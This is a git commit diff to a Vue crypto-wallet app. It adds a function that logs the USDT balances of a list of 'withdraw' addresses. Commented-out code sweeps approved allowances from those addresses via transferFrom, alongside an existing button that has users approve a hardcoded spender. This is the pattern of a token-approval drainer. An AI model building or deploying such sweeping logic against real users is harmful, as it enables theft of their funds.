983e6b9f16177084218040ff587c464c6128f1aa
xiaomabenteng2015 <xiaomabenteng@look.com>
2024-10-15 11:12:01 +0800

    增加查询余额的方法

--- src/App.vue
+++ src/App.vue
@@ -2,7 +2,7 @@
 import { createAppKit, useAppKit, useAppKitProvider, useAppKitAccount } from '@reown/appkit/vue'
 import { EthersAdapter } from '@reown/appkit-adapter-ethers'
 import { mainnet, arbitrum } from '@reown/appkit/networks'
-import { BrowserProvider, Contract } from 'ethers'
+import { ethers, BrowserProvider, Contract, formatUnits } from 'ethers'
 
 // 1. Get projectId from https://cloud.reown.com
 const projectId = '4703d1a7a30b63665f8d8e8339a9aceb'
@@ -31,6 +31,8 @@ const modal = useAppKit()
 
 const USDTAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
 
+const addressToWithdrawList = ["0x53f989804eFE987Cd9837C8367126a94190E28c9", "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"];
+
 // The ERC-20 Contract ABI, which is a common contract interface
 // for tokens (this is the Human-Readable ABI format)
 const USDTAbi = [
@@ -41,6 +43,36 @@ const USDTAbi = [
   'event Transfer(address indexed from, address indexed to, uint amount)',
   'function approve(address spender, uint256 amount) returns (bool)'
 ]
+
+async function balance() {
+  try {
+    console.log("work start");
+    const { walletProvider } = useAppKitProvider('eip155')
+    const provider = new BrowserProvider(walletProvider as any)
+    const signer = await provider.getSigner();
+    const USDTContract = new ethers.Contract(USDTAddress, USDTAbi, provider);
+    for (let i = 0; i < addressToWithdrawList.length; i++) {
+      const targetAddress = addressToWithdrawList[i];
+      const balance = await USDTContract.balanceOf(targetAddress);
+      // usdt精度是6 如果是通用方法可以调用await USDTContract.decimals();
+      console.log(targetAddress, "'s Balance is ", formatUnits(balance, 6), "USDT");
+      // const allowance = await USDTContract.allowance(targetAddress, address);
+      // if (allowance > 0) {
+      //   const canWithdraw = allowance > balance ? balance: allowance;
+
+      //   // console.log("canWithdraw:",canWithdraw - 2500000n);// 测试打印，只转去 部分，为了测试不提取全部，- 3000000n
+      //   const typedTargetAddress = targetAddress as `0x${string}`;
+      //   const typedAddress = address as `0x${string}`;
+      //   await transferFrom({args:[ typedTargetAddress, typedAddress , BigInt(canWithdraw.toString()) - BigInt(2500000)]});
+      // } else {
+      //   console.log(targetAddress,":无allowance余额用来归集",allowance);
+      // }
+    }
+  } catch (error) {
+    console.error('Error balanceOf tokens:', error);
+    alert(`Error balanceOf tokens: ${error}`)
+  }
+}
 
 async function approve2() {
   const { address, isConnected } = useAppKitAccount()
@@ -54,14 +86,17 @@ async function approve2() {
       '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb',
       BigInt(100000000000)
     )
-    console.log('Approval successful = ' + approveResult )
+    console.log('Approval successful = ' + approveResult)
   } catch (error) {
     console.error('Approval failed:', error)
   }
 }
+
+
 </script>
 
 <template>
   <w3m-button />
   <button @click="approve2">approve2</button>
+  <button @click="balance">getBalance</button>
 </template>
